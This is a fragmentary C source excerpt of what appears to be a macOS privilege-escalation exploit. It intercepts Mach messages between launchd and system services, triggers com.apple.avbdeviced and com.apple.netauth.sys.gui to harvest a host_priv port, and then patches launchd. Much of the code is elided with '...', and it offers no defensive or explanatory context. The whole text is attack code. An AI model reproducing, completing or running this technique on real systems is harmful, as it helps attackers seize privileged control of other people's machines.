...
// A task_for_pid workaround using processor_set_tasks.
static mach_port_t
...
// Try to get the host_priv port from an intercepted Mach port.
static bool
get_host_priv(mach_port_t port, mach_port_t host_self, mach_port_t *host_priv) {
	...
	TRACE("Got task port %x for process %u", port, pid);
	// If we already have a host_priv, no need to try and get another.
	if (*host_priv != MACH_PORT_NULL) {
		return false;
	}
	// See if this task has a host_priv port.
	...
	if (task_host != MACH_PORT_NULL && task_host != host_self) {
		...
		if (kr == KERN_SUCCESS) {
			TRACE("Got host priv port %x!", task_host);
			*host_priv = task_host;
			return true;
		}
	}
	// If we get here, then this wasn't a host_priv port.
	ERROR("Process %u did not have host_priv port", pid);
...
fix_launchd(mach_port_t real_service, mach_port_t fake_service, mach_port_t host_priv) {
	...
	TRACE("launchd task: %x", launchd_task);
...
start_service(const char *service_name) {
	...
	mach_msg_header_t msg = {};
	msg.msgh_bits        = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, 0, 0);
	msg.msgh_size        = sizeof(msg);
	msg.msgh_remote_port = service_port;
	msg.msgh_id          = 0x11223344;
	kern_return_t kr = mach_msg(&msg,
			MACH_SEND_MSG,
			msg.msgh_size,
			0,
...
int main() {
	...
	dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 100 * NSEC_PER_MSEC),
		...
		start_service("com.apple.avbdeviced");
		start_service("com.apple.netauth.sys.gui");
	});
	...
	mach_mitm_server(real_service, fake_service, ^bool (mach_msg_header_t *msg) {
		...
		mach_message_inspect_ports(msg, ^(mach_port_t port) {
			just_got_host_priv = get_host_priv(port, host_self, &host_priv);
		});
		// If we just got the host_priv port, fix up launchd and then destroy the fake
	...
	// We did it! We've (hopefully) fixed up launchd and now have the host_priv port!
	TRACE("We did it :) Yay!");
	return 0;
}
